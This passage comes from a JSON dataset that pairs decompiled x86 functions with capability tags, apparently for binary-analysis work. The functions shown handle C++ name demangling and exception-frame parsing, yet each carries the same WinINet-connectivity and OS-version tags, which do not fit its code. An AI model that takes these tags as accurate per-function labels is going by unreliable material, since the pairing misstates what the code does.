*(in_EAX + 0x128) + 1;\n                                    iVar6 = 1;\n                                    iVar3 = 0;\n                                }\n                                *(in_EAX + 0x100) = iVar6;\n                                *(in_EAX + iVar3) = 0x2e;\n                                *(in_EAX + 0x104) = 0x2e;\n                            }\n                            puVar9 = *(param_1[1] + 0xc);\n                            uVar4 = *puVar9;\n                            if (uVar4 == 0x46) {\n                                puVar8 = 0x503b5a;\n                                uVar7 = 0x7b;\n                                iVar3 = *(in_EAX + 0x100);\n                                while( true ) {\n                                    if (iVar3 == 0xff) {\n                                        *(in_EAX + 0xff) = 0;\n                                        (**(in_EAX + 0x108))();\n                                        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                                        iVar6 = 1;\n                                        iVar3 = 0;\n                                    }\n                                    else {\n                                        iVar6 = iVar3 + 1;\n                                    }\n                                    *(in_EAX + 0x100) = iVar6;\n                                    *(in_EAX + iVar3) = uVar7;\n                                    *(in_EAX + 0x104) = uVar7;\n                                    if (puVar8 == 0x503b66) break;\n                                    uVar7 = *puVar8;\n                                    puVar8 = puVar8 + 1;\n                                    iVar3 = iVar6;\n                                }\n                                puVar8 = auStack53;\n                                sub.msvcrt.dll_sprintf(puVar8, 0x503b67, puVar9[3] + 1);\n                                iVar6 = sub.msvcrt.dll_strlen(puVar8);\n                                iVar3 = *(in_EAX + 0x100);\n                                if (iVar6 != 0) {\n                                    puVar5 = puVar8 + iVar6;\n                                    iVar6 = iVar3;\n                                    do {\n                                        uVar7 = *puVar8;\n                                        if (iVar6 == 0xff) {\n                                            *(in_EAX + 0xff) = 0;\n                                            (**(in_EAX + 0x108))();\n                                            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                                            iVar3 = 1;\n                                            iVar6 = 0;\n                                        }\n                                        else {\n                                            iVar3 = iVar6 + 1;\n                                        }\n                                        puVar8 = puVar8 + 1;\n                                        *(in_EAX + 0x100) = iVar3;\n                                        *(in_EAX + iVar6) = uVar7;\n                                        *(in_EAX + 0x104) = uVar7;\n                                        iVar6 = iVar3;\n                                    } while (puVar5 != puVar8);\n                                }\n                                puVar8 = 0x503b6a;\n                                uVar7 = 0x7d;\n                                do {\n                                    if (iVar3 == 0xff) {\n                                        *(in_EAX + 0xff) = 0;\n                                        (**(in_EAX + 0x108))();\n                                        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                                        iVar6 = 1;\n                                        iVar3 = 0;\n                                    }\n                                    else {\n                                        iVar6 = iVar3 + 1;\n                                    }\n                                    *(in_EAX + 0x100) = iVar6;\n                                    puVar8 = puVar8 + 1;\n                                    *(in_EAX + iVar3) = uVar7;\n                                    *(in_EAX + 0x104) = uVar7;\n                                    if (puVar8 == 0x503b6d) goto code_r0x004168f5;\n                                    uVar7 = *puVar8;\n                                    iVar3 = iVar6;\n                                } while( true );\n                            }\n                            do {\n                                if (uVar4 != 0x4c) {\n                                    if (uVar4 < 0x4d) {\n                                        if (4 < uVar4 - 0x1c) {\ncode_r0x00416890:\n                                            fcn.00411160();\n                                            *(in_EAX + 0x110) = uVar1;\n                                            return;\n                                        }\n                                    }\n                                    else if (1 < uVar4 - 0x4e) goto code_r0x00416890;\n                                }\ncode_r0x004168f5:\n                                puVar9 = puVar9[2];\n                                uVar4 = *puVar9;\n                            } while( true );\n                        }\n                        fcn.00415af0();\n                        *(in_EAX + 0x110) = uVar1;\n                    }\n                }\n            }\n            param_1 = *param_1;\n            if (param_1 == NULL) {\n                return;\n            }\n            iVar3 = *(in_EAX + 0x118);\n        }\n    }\n    return;\n}\n",
        "token_count": 1877
    },
    "004172d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Could not reconcile some variable overlaps\n\nbool __fastcall fcn.004172d0(uint param_1, code *param_2)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    code *pcVar4;\n    uint8_t *in_EAX;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint32_t extraout_ECX;\n    uint *puVar9;\n    uint8_t *puVar10;\n    uint8_t uVar11;\n    uint8_t *puVar12;\n    bool bVar13;\n    bool bVar14;\n    ulong uVar15;\n    uint var_1b8h;\n    uint var_1b4h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_19ch;\n    uint var_198h;\n    uint var_194h;\n    uint var_190h;\n    uint var_18ch;\n    uint var_188h;\n    uint var_184h;\n    uint var_180h;\n    uint var_17ch;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_bp_ch;\n    uint8_t *apuStack480 [4];\n    uchar auStack464 [16];\n    int32_t var_1bch;\n    int32_t var_1b8h_2;\n    uint32_t var_1b4h_2;\n    int32_t iStack436;\n    int32_t *var_1ach_2;\n    uint var_19ch_2;\n    uint8_t *puStack412;\n    uint32_t uStack408;\n    uint8_t *s;\n    uint32_t var_18ch_2;\n    int32_t var_188h_2;\n    int32_t var_184h_2;\n    uchar *puStack388;\n    uint uStack384;\n    int32_t iStack380;\n    uint uStack376;\n    uint uStack372;\n    uint uStack368;\n    uint uStack364;\n    uchar auStack360 [256];\n    int32_t var_64h_2;\n    uchar uStack100;\n    code *var_5ch_2;\n    int32_t var_58h_2;\n    uint uStack88;\n    uint uStack84;\n    int32_t var_4ch_2;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uchar *var_34h_2;\n    uint uStack52;\n    int32_t iStack48;\n    uchar *var_28h_2;\n    uint uStack40;\n    int32_t var_20h_2;\n    uint uStack32;\n    \n    uVar11 = *in_EAX;\n    var_1b4h_2 = var_1b4h_2 & 0xffffff00 | uVar11;\n    bVar13 = uVar11 < 0x5f;\n    bVar14 = uVar11 == 0x5f;\n    if (bVar14) {\n        bVar13 = in_EAX[1] < 0x5a;\n        bVar14 = in_EAX[1] == 0x5a;\n        uVar11 = 1;\n        if (bVar14) goto code_r0x00417340;\n    }\n    iVar8 = 8;\n    puVar10 = in_EAX;\n    puVar12 = \"_GLOBAL_\";\n    do {\n        if (iVar8 == 0) break;\n        iVar8 = iVar8 + -1;\n        bVar13 = *puVar10 < *puVar12;\n        bVar14 = *puVar10 == *puVar12;\n        puVar10 = puVar10 + 1;\n        puVar12 = puVar12 + 1;\n    } while (bVar14);\n    uVar11 = 0;\n    if (((((!bVar13 && !bVar14) == bVar13) && ((uVar1 = in_EAX[8],  uVar1 == 0x2e || uVar1 == 0x5f || (uVar1 == 0x24))))\n        && ((uVar1 = in_EAX[9],  uVar1 == 0x44 || (uVar11 = 0,  uVar1 == 0x49)))) && (uVar11 = 0,  in_EAX[10] == 0x5f))\n    {\n        uVar11 = (uVar1 != 0x49) + 2;\n    }\ncode_r0x00417340:\n    apuStack480[0] = 0x417348;\n    var_1ach_2 = param_2;\n    iStack380 = sub.msvcrt.dll_strlen();\n    puStack412 = in_EAX + iStack380;\n    uStack408 = 0x11;\n    var_1b8h_2 = iStack380 * 2;\n    var_188h_2 = 0;\n    uStack384 = 0;\n    uStack376 = 0;\n    uStack372 = 0;\n    uStack368 = 0;\n    uStack364 = 0;\n    apuStack480[0] = 0x4173c4;\n    s = in_EAX;\n    var_184h_2 = var_1b8h_2;\n    iVar8 = fcn.00418950();\n    iVar8 = -iVar8;\n    *(&stack0xfffffe20 + iVar8) = 0x4173e8;\n    uVar15 = fcn.00418950();\n    iVar2 = -uVar15;\n    var_18ch_2 = extraout_ECX;\n    puStack388 = &stack0xfffffe30 + iVar2 + iVar8;\n    if (uVar11 == 1) {\n        if (var_1b4h_2 != '_') {\n            return false;\n        }\n        if (in_EAX[1] != 0x5a) {\n            return false;\n        }\n        s = in_EAX + 2;\n        *(&stack0xfffffe20 + iVar2 + iVar8) = 0x417655;\n        uVar6 = fcn.00410a50();\n        if ((uStack408 & 1) == 0) {\n            uVar11 = *s;\n        }\n        else {\n            uVar11 = *s;\n            puVar10 = s;\n            while (s = puVar10,  uVar11 == 0x2e) {\n                uVar11 = puVar10[1];\n                if ((uVar11 + 0x9f < 0x1a) || (uVar11 == 0x5f)) {\n                    uVar11 = puVar10[2];\n                    s = puVar10 + 2;\n                    var_1b4h_2 = var_1b4h_2 & 0xffffff00 | uVar11;\n                    if ((uVar11 + 0x9f < 0x1a) || (uVar11 == 0x5f)) {\n                        var_1b4h_2 = uVar6;\n                        do {\n                            do {\n                                s = s + 1;\n                                uVar11 = *s;\n                            } while (uVar11 + 0x9f < 0x1a);\n                        } while (uVar11 == 0x5f);\n                    }\n                }\n                else {\n                    if (9 < uVar11 - 0x30) {\n                        uVar11 = *puVar10;\n                        break;\n                    }\n                    uVar11 = *puVar10;\n                }\n                while ((uVar11 == 0x2e && (s[1] - 0x30 < 10))) {\n                    puVar12 = s + 2;\n                    s = s + 2;\n                    uVar11 = *puVar12;\n                    while (uVar11 - 0x30 < 10) {\n                        s = s + 1;\n                        uVar11 = *s;\n                    }\n                }\n                if (var_188h_2 < var_184h_2) {\n                    puVar9 = var_188h_2 * 0x10 + var_18ch_2;\n                    puVar9[1] = 0;\n                    var_188h_2 = var_188h_2 + 1;\n                    if (s - puVar10 == 0) goto code_r0x004177f0;\n                    puVar9[1] = 0;\n                    *puVar9 = 0;\n                    puVar9[2] = puVar10;\n                    puVar9[3] = s - puVar10;\n                }\n                else {\ncode_r0x004177f0:\n                    puVar9 = NULL;\n                }\n                *(&stack0xfffffe24 + iVar2 + iVar8) = puVar9;\n                *(&stack0xfffffe20 + iVar2 + iVar8) = 0x4177d0;\n                uVar6 = fcn.0040df00();\n                puVar10 = s;\n                uVar11 = *s;\n            }\n        }\n    }\n    else if ((uVar11 == 0) || (3 < uVar11)) {\n        *(&stack0xfffffe20 + iVar2 + iVar8) = 0x4174de;\n        uVar6 = fcn.0040f7c0();\n        uVar11 = *s;\n    }\n    else {\n        puVar10 = in_EAX + 0xb;\n        s = puVar10;\n        if ((in_EAX[0xb] == 0x5f) && (in_EAX[0xc] == 0x5a)) {\n            s = in_EAX + 0xd;\n            *(&stack0xfffffe20 + iVar2 + iVar8) = 0x4176b2;\n            fcn.00410a50();\n        }\n        else {\n            var_1bch = uVar15 >> 0x20;\n            var_1b4h_2 = extraout_ECX;\n            *(&stack0xfffffe24 + iVar2 + iVar8) = puVar10;\n            *(&stack0xfffffe20 + iVar2 + iVar8) = 0x41743b;\n            iVar5 = sub.msvcrt.dll_strlen();\n            if (0 < var_1b8h_2) {\n                *(var_1bch * 4 + 4) = 0;\n                var_188h_2 = 1;\n                if (iVar5 != 0) {\n                    *(var_1bch * 4 + 8) = puVar10;\n                    *(var_1bch * 4) = 0;\n                    *(var_1bch * 4 + 0xc) = iVar5;\n                }\n            }\n        }\n        *(&stack0xfffffe24 + iVar2 + iVar8) = 0;\n        *(&stack0xfffffe20 + iVar2 + iVar8) = 0x4174aa;\n        uVar6 = fcn.0040df00();\n        puVar10 = s;\n        *(&stack0xfffffe24 + iVar2 + iVar8) = s;\n        *(&stack0xfffffe20 + iVar2 + iVar8) = 0x4174ba;\n        iVar5 = sub.msvcrt.dll_strlen();\n        s = puVar10 + iVar5;\n        uVar11 = puVar10[iVar5];\n    }\n    if ((uVar6 != 0) && (uVar11 == 0)) {\n        uStack100 = 0;\n        var_64h_2 = 0;\n        var_5ch_2 = var_1ach_2;\n        uStack88 = 0;\n        var_58h_2 = iStack436;\n        uStack84 = 0;\n        uStack68 = 0;\n        uStack64 = 0;\n        var_4ch_2 = 0;\n        uStack76 = 0;\n        uStack72 = 0;\n        uStack60 = 0;\n        var_34h_2 = NULL;\n        uStack52 = 0;\n        iStack48 = 0;\n        var_28h_2 = NULL;\n        uStack40 = 0;\n        var_20h_2 = 0;\n        *(&stack0xfffffe20 + iVar2 + iVar8) = 0x417583;\n        fcn.0040dfc0();\n        uStack32 = 0;\n        var_1ach_2 = &stack0xfffffe24 + iVar2 + iVar8;\n        var_20h_2 = var_20h_2 * iStack48;\n        *(&stack0xfffffe20 + iVar2 + iVar8) = 0x4175b8;\n        iVar5 = fcn.00418950();\n        iVar5 = -iVar5;\n        *(&stack0xfffffe20 + iVar5 + iVar2 + iVar8) = 0x4175d5;\n        iVar7 = fcn.00418950();\n        var_34h_2 = &stack0xfffffe30 + iVar5 + iVar2 + iVar8;\n        var_28h_2 = &stack0xfffffe30 + -iVar7 + iVar5 + iVar2 + iVar8;\n        *(&stack0xfffffe20 + -iVar7 + iVar5 + iVar2 + iVar8) = 0x4175ef;\n        fcn.00411160();\n        iVar2 = var_58h_2;\n        iVar8 = var_64h_2;\n        piVar3 = var_1ach_2;\n        (&stack0xfffffe98)[var_64h_2] = 0;\n        var_1ach_2[2] = iVar2;\n        piVar3[1] = iVar8;\n        *piVar3 = &stack0xfffffe98;\n        pcVar4 = var_5ch_2;\n        piVar3[-1] = 0x417611;\n        (*pcVar4)();\n        return var_4ch_2 == 0;\n    }\n    return false;\n}\n",
        "token_count": 3302
    },
    "00417860": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004178cd)\n// WARNING: Removing unreachable block (ram,0x0041799d)\n// WARNING: Removing unreachable block (ram,0x004179a1)\n// WARNING: Removing unreachable block (ram,0x00417934)\n// WARNING: Removing unreachable block (ram,0x004178da)\n// WARNING: Removing unreachable block (ram,0x00417970)\n// WARNING: Removing unreachable block (ram,0x00417978)\n// WARNING: Removing unreachable block (ram,0x004178e2)\n// WARNING: Removing unreachable block (ram,0x00417960)\n// WARNING: Removing unreachable block (ram,0x00417968)\n// WARNING: Removing unreachable block (ram,0x004178f2)\n// WARNING: Removing unreachable block (ram,0x0041790f)\n// WARNING: Removing unreachable block (ram,0x00417913)\n\nuint fcn.00417860(int32_t param_1, int32_t param_2, int32_t param_3, uint *param_4)\n\n{\n    int32_t iVar1;\n    \n    if ((param_1 == 0) || ((param_2 != 0 && (param_3 == 0)))) {\n        if (param_4 != NULL) {\n            *param_4 = 0xfffffffd;\n        }\n    }\n    else {\n        iVar1 = fcn.004172d0();\n        if (iVar1 == 0) {\n            fcn.00427908(0);\n        }\n        if (param_4 != NULL) {\n            *param_4 = 0xfffffffe;\n            return 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 370
    },
    "00417f50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Unable to track spacebase fully for stack\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00417fb8)\n// WARNING: Removing unreachable block (ram,0x00418081)\n// WARNING: Removing unreachable block (ram,0x00417fc7)\n// WARNING: Removing unreachable block (ram,0x00418105)\n// WARNING: Removing unreachable block (ram,0x00418113)\n// WARNING: Removing unreachable block (ram,0x004181b6)\n// WARNING: Removing unreachable block (ram,0x00418121)\n// WARNING: Removing unreachable block (ram,0x00418086)\n// WARNING: Removing unreachable block (ram,0x0041808e)\n// WARNING: Removing unreachable block (ram,0x00418099)\n// WARNING: Removing unreachable block (ram,0x004181c0)\n// WARNING: Removing unreachable block (ram,0x00418230)\n// WARNING: Removing unreachable block (ram,0x00418281)\n// WARNING: Removing unreachable block (ram,0x0041829a)\n// WARNING: Removing unreachable block (ram,0x00418237)\n// WARNING: Removing unreachable block (ram,0x0041823e)\n// WARNING: Removing unreachable block (ram,0x004181e3)\n// WARNING: Removing unreachable block (ram,0x00418245)\n// WARNING: Removing unreachable block (ram,0x00418305)\n// WARNING: Removing unreachable block (ram,0x00418262)\n// WARNING: Removing unreachable block (ram,0x004182f0)\n// WARNING: Removing unreachable block (ram,0x004181ea)\n// WARNING: Removing unreachable block (ram,0x004182b5)\n// WARNING: Removing unreachable block (ram,0x004182bc)\n// WARNING: Removing unreachable block (ram,0x00418325)\n// WARNING: Removing unreachable block (ram,0x004182d5)\n// WARNING: Removing unreachable block (ram,0x004182d9)\n// WARNING: Removing unreachable block (ram,0x004181f5)\n// WARNING: Removing unreachable block (ram,0x0041833e)\n// WARNING: Removing unreachable block (ram,0x00418212)\n// WARNING: Removing unreachable block (ram,0x00418216)\n// WARNING: Removing unreachable block (ram,0x0041826a)\n// WARNING: Removing unreachable block (ram,0x00418277)\n// WARNING: Removing unreachable block (ram,0x00418360)\n// WARNING: Removing unreachable block (ram,0x004182fe)\n// WARNING: Removing unreachable block (ram,0x004180a5)\n// WARNING: Removing unreachable block (ram,0x004180b4)\n// WARNING: Removing unreachable block (ram,0x004180c0)\n// WARNING: Removing unreachable block (ram,0x00418131)\n// WARNING: Removing unreachable block (ram,0x0041814a)\n// WARNING: Removing unreachable block (ram,0x0041814d)\n// WARNING: Removing unreachable block (ram,0x004180e3)\n// WARNING: Removing unreachable block (ram,0x004181a2)\n// WARNING: Removing unreachable block (ram,0x004180ec)\n// WARNING: Removing unreachable block (ram,0x004180f5)\n// WARNING: Removing unreachable block (ram,0x00418180)\n// WARNING: Removing unreachable block (ram,0x0041818e)\n// WARNING: Removing unreachable block (ram,0x00418191)\n// WARNING: Removing unreachable block (ram,0x00418163)\n// WARNING: Removing unreachable block (ram,0x00418172)\n// WARNING: Removing unreachable block (ram,0x00417fcf)\n// WARNING: Removing unreachable block (ram,0x00417fd4)\n// WARNING: Removing unreachable block (ram,0x00417fdc)\n// WARNING: Removing unreachable block (ram,0x00418003)\n// WARNING: Removing unreachable block (ram,0x00418028)\n// WARNING: Removing unreachable block (ram,0x0041802b)\n// WARNING: Removing unreachable block (ram,0x00418039)\n// WARNING: Removing unreachable block (ram,0x00418042)\n// WARNING: Removing unreachable block (ram,0x00418054)\n// WARNING: Removing unreachable block (ram,0x0041806e)\n// WARNING: Removing unreachable block (ram,0x00418079)\n// WARNING: Removing unreachable block (ram,0x00418000)\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint fcn.00417f50(void)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_1ch;\n    uint var_ch;\n    \n    if (*0x5493bc == 0) {\n        *0x5493bc = 1;\n        fcn.00418760();\n        iVar1 = fcn.00418950();\n        *0x5493c0 = 0;\n        *0x5493c4 = &var_2ch + (3 - iVar1) & 0xfffffff0;\n        in_EAX = 0;\n    }\n    return in_EAX;\n}\n",
        "token_count": 1159
    },
    "00419990": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00419990(uint param_1, int32_t **param_2)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    char cVar5;\n    code *pcVar6;\n    int32_t in_EAX;\n    int32_t iVar7;\n    int32_t **ppiVar8;\n    uint8_t *puVar9;\n    uint *puVar10;\n    uint8_t uVar11;\n    uint8_t uVar12;\n    int32_t iVar13;\n    uint32_t uVar14;\n    int32_t extraout_ECX;\n    uint32_t uVar15;\n    uint8_t extraout_DL;\n    uint8_t *puVar16;\n    int32_t **ppiVar17;\n    char *pcVar18;\n    uint8_t *puVar19;\n    int32_t **ppiVar20;\n    int32_t *piVar21;\n    uint32_t uVar22;\n    ulong uVar23;\n    int32_t **ppiStack404;\n    uint uStack384;\n    int32_t **ppiStack380;\n    int32_t *apiStack376 [67];\n    int32_t **ppiStack108;\n    int32_t iStack104;\n    int32_t **ppiStack100;\n    int32_t **ppiStack96;\n    int32_t **ppiStack92;\n    int32_t iStack88;\n    int32_t iStack64;\n    int32_t iStack60;\n    int32_t **ppiStack56;\n    int32_t iStack52;\n    uint8_t uStack45;\n    int32_t *piStack32;\n    \n    ppiVar8 = param_2;\n    for (iVar13 = 0x30; iVar13 != 0; iVar13 = iVar13 + -1) {\n        *ppiVar8 = NULL;\n        ppiVar8 = ppiVar8 + 1;\n    }\n    *(in_EAX + 0x68) = 0;\n    *(in_EAX + 0x50) = 0;\n    if (*(in_EAX + 0x4c) == 0) {\n        return 5;\n    }\n    iStack88 = in_EAX + 0x54;\n    iStack60 = *(in_EAX + 0x60);\n    ppiStack92 = (*(in_EAX + 0x4c) + -1) - (iStack60 >> 0x1f);\n    ppiStack96 = 0x4199e0;\n    iStack64 = in_EAX;\n    iStack60 = fcn.0041cad0();\n    if (iStack60 != 0) {\n        param_2[0x29] = *(iStack64 + 0x5c);\n        iVar13 = (iStack60 + 4) - *(iStack60 + 4);\n        ppiStack92 = iVar13 + 9;\n        ppiStack96 = 0x419a18;\n        ppiStack56 = ppiStack92;\n        iStack52 = iVar13;\n        iVar7 = sub.msvcrt.dll_strlen();\n        ppiVar8 = iVar13 + 10 + iVar7;\n        if ((*(iVar13 + 9) == 'e') && (*(iStack52 + 10) == 'h')) {\n            piVar21 = *ppiVar8;\n            ppiStack56 = iStack52 + 0xb;\n            ppiVar8 = ppiVar8 + 1;\n            param_2[0x2f] = piVar21;\n        }\n        uVar12 = *ppiVar8;\n        uStack45 = *(iStack52 + 8);\n        if (3 < uStack45) {\n            if (uVar12 != 4) {\n                return 3;\n            }\n            if (*(ppiVar8 + 1) != '\\0') {\n                return 3;\n            }\n            uVar12 = *(ppiVar8 + 2);\n            ppiVar8 = ppiVar8 + 2;\n        }\n        piVar21 = NULL;\n        uVar11 = 0;\n        while( true ) {\n            ppiVar8 = ppiVar8 + 1;\n            uVar3 = uVar11 & 0x1f;\n            uVar11 = uVar11 + 7;\n            piVar21 = piVar21 | (uVar12 & 0x7f) << uVar3;\n            if (-1 < uVar12) break;\n            uVar12 = *ppiVar8;\n        }\n        param_2[0x2c] = piVar21;\n        piVar21 = NULL;\n        uVar14 = 0;\n        do {\n            ppiVar17 = ppiVar8;\n            ppiVar8 = ppiVar17 + 1;\n            uVar12 = *ppiVar17;\n            uVar11 = uVar14;\n            uVar14 = uVar14 + 7;\n            piVar21 = piVar21 | (uVar12 & 0x7f) << (uVar11 & 0x1f);\n        } while (uVar12 < '\\0');\n        if ((uVar14 < 0x20) && ((uVar12 & 0x40) != 0)) {\n            piVar21 = piVar21 | -1 << (uVar14 & 0x1f);\n        }\n        uVar12 = 0;\n        param_2[0x2b] = piVar21;\n        if (uStack45 == 1) {\n            ppiVar17 = ppiVar17 + 2;\n            param_2[0x2d] = *ppiVar8;\n        }\n        else {\n            piVar21 = NULL;\n            do {\n                ppiVar17 = ppiVar8 + 1;\n                uVar11 = *ppiVar8;\n                uVar3 = uVar12 & 0x1f;\n                uVar12 = uVar12 + 7;\n                piVar21 = piVar21 | (uVar11 & 0x7f) << uVar3;\n                ppiVar8 = ppiVar17;\n            } while (uVar11 < '\\0');\n            param_2[0x2d] = piVar21;\n        }\n        *(param_2 + 0xb9) = 0xff;\n        cVar5 = *ppiStack56;\n        ppiStack108 = ppiVar17;\n        pcVar18 = ppiStack56;\n        ppiVar8 = NULL;\n        if (cVar5 == 'z') {\n            uVar14 = 0;\n            uVar12 = 0;\n            ppiVar8 = ppiVar17;\n            do {\n                ppiVar17 = ppiVar8 + 1;\n                uVar11 = *ppiVar8;\n                uVar3 = uVar12 & 0x1f;\n                uVar12 = uVar12 + 7;\n                uVar14 = uVar14 | (uVar11 & 0x7f) << uVar3;\n                ppiVar8 = ppiVar17;\n            } while (uVar11 < '\\0');\n            *(param_2 + 0xba) = 1;\n            pcVar18 = ppiStack56 + 1;\n            cVar5 = *(ppiStack56 + 1);\n            ppiStack108 = ppiVar17;\n            ppiVar8 = ppiVar17 + uVar14;\n        }\n        while (ppiStack56 = ppiVar8,  iStack104 = iStack52,  cVar5 != '\\0') {\n            if (cVar5 == 'L') {\n                uVar1 = *ppiStack108;\n                ppiStack108 = ppiStack108 + 1;\n                *(param_2 + 0xb9) = uVar1;\n            }\n            else if (cVar5 == 'R') {\n                uVar1 = *ppiStack108;\n                ppiStack108 = ppiStack108 + 1;\n                *(param_2 + 0x2e) = uVar1;\n            }\n            else if (cVar5 == 'P') {\n                ppiVar17 = *ppiStack108;\n                ppiStack96 = 0x419b9f;\n                fcn.004190f0();\n                ppiStack92 = &stack0xffffffe0;\n                ppiStack96 = 0x419bb2;\n                ppiStack108 = fcn.00418fb0();\n                param_2[0x2a] = piStack32;\n            }\n            else {\n                ppiVar8 = ppiStack56;\n                if (cVar5 != 'S') goto code_r0x00419d74;\n                *(param_2 + 0xbb) = 1;\n            }\n            cVar5 = pcVar18[1];\n            pcVar18 = pcVar18 + 1;\n            ppiVar8 = ppiStack56;\n        }\n        ppiVar17 = ppiStack108;\n        ppiVar8 = ppiStack108;\n        ppiVar20 = ppiStack56;\n        if (ppiStack56 == NULL) {\ncode_r0x00419d74:\n            ppiStack108 = ppiVar17;\n            ppiVar20 = ppiVar8;\n            if (ppiVar8 == NULL) {\n                return 3;\n            }\n        }\n        ppiStack96 = 0x419be9;\n        ppiStack92 = param_2;\n        fcn.00419130();\n        if (*(param_2 + 0x2e) == 0xff) {\n            iVar13 = 8;\n        }\n        else {\n            uVar12 = *(param_2 + 0x2e) & 7;\n            if (uVar12 == 2) {\n                iVar13 = 0xc;\n            }\n            else {\n                if (uVar12 < 3) {\n                    if (uVar12 != 0) {\ncode_r0x00419fa8:\n                        ppiStack96 = 0x419fad;\n                        uVar23 = sub.msvcrt.dll_abort();\n                        puVar16 = uVar23 >> 0x20;\n                        ppiStack96 = ppiVar20;\n                        ppiStack100 = param_2;\n                        apiStack376[0] = iStack88;\n                        if (uVar23 < puVar16) {\n                            ppiStack404 = 0x1;\n                            puVar19 = uVar23;\n                            do {\n                                uVar12 = *puVar19;\n                                uVar14 = uVar12;\n                                puVar9 = puVar19 + 1;\n                                switch(uVar14 - 3 & 0xff) {\n                                case 0:\n                                case 9:\n                                case 10:\n                                    param_2 = *(puVar19 + 1);\n                                    puVar9 = puVar19 + 5;\n                                    break;\n                                default:\ncode_r0x0041a4a9:\n                                    do {\n                                        sub.msvcrt.dll_abort();\n                                        uVar12 = extraout_DL;\ncode_r0x0041a4b0:\n                                        ppiStack404 = ppiVar20;\n                                        if (uVar12 == 6) {\n                                            param_2 = *param_2;\n                                            goto code_r0x0041a010;\n                                        }\n                                    } while (uVar12 != 0x19);\n                                    param_2 = (param_2 ^ param_2 >> 0x1f) - (param_2 >> 0x1f);\n                                    break;\n                                case 3:\n                                case 0x16:\n                                case 0x1c:\n                                case 0x1d:\n                                case 0x20:\n                                case 0x91:\n                                    if (ppiStack404 == NULL) goto code_r0x004014e0;\n                                    ppiVar20 = ppiStack404 + -1;\n                                    param_2 = *(&stack0xfffffe88 + ppiVar20 * 4);\n                                    ppiStack404 = ppiVar20;\n                                    if (uVar12 == 0x1f) {\n                                        param_2 = -param_2;\n                                    }\n                                    else {\n                                        if (uVar12 < 0x20) goto code_r0x0041a4b0;\n                                        if (uVar12 == 0x23) {\n                                            uVar14 = 0;\n                                            uVar12 = 0;\n                                            puVar19 = puVar9;\n                                            do {\n                                                puVar9 = puVar19 + 1;\n                                                uVar11 = *puVar19;\n                                                uVar3 = uVar12 & 0x1f;\n                                                uVar12 = uVar12 + 7;\n                                                uVar14 = uVar14 | (uVar11 & 0x7f) << uVar3;\n                                                puVar19 = puVar9;\n                                            } while (uVar11 < '\\0');\n                                            param_2 = param_2 + uVar14;\n                                        }\n                                        else if (uVar12 == 0x94) {\n                                            uVar12 = puVar19[1];\n                                            puVar19 = puVar19 + 2;\n                                            if (uVar12 == 2) {\n                                                param_2 = *param_2;\n                                                puVar9 = puVar19;\n                                            }\n                                            else if (uVar12 < 3) {\n                                                if (uVar12 != 1) goto code_r0x0041a4a9;\n                                                param_2 = *param_2;\n                                                puVar9 = puVar19;\n                                            }\n                                            else {\n                                                if ((uVar12 != 4) && (uVar12 != 8)) goto code_r0x0041a4a9;\n                                                param_2 = *param_2;\n                                                puVar9 = puVar19;\n                                            }\n                                        }\n                                        else {\n                                            if (uVar12 != 0x20) goto code_r0x0041a4a9;\n                                            param_2 = ~param_2;\n                                        }\n                                    }\n                                    break;\n                                case 5:\n                                    param_2 = puVar19[1];\n                                    puVar9 = puVar19 + 2;\n                                    break;\n                                case 6:\n                                    param_2 = puVar19[1];\n                                    puVar9 = puVar19 + 2;\n                                    break;\n                                case 7:\n                                    param_2 = *(puVar19 + 1);\n                                    puVar9 = puVar19 + 3;\n                                    break;\n                                case 8:\n                                    param_2 = *(puVar19 + 1);\n                                    puVar9 = puVar19 + 3;\n                                    break;\n                                case 0xb:\n                                case 0xc:\n                                    param_2 = *(puVar19 + 1);\n                                    puVar9 = puVar19 + 9;\n                                    break;\n                                case 0xd:\n                                    param_2 = NULL;\n                                    uVar12 = 0;\n                                    puVar19 = puVar9;\n                                    do {\n                                        puVar9 = puVar19 + 1;\n                                        uVar11 = *puVar19;\n                                        uVar3 = uVar12 & 0x1f;\n                                        uVar12 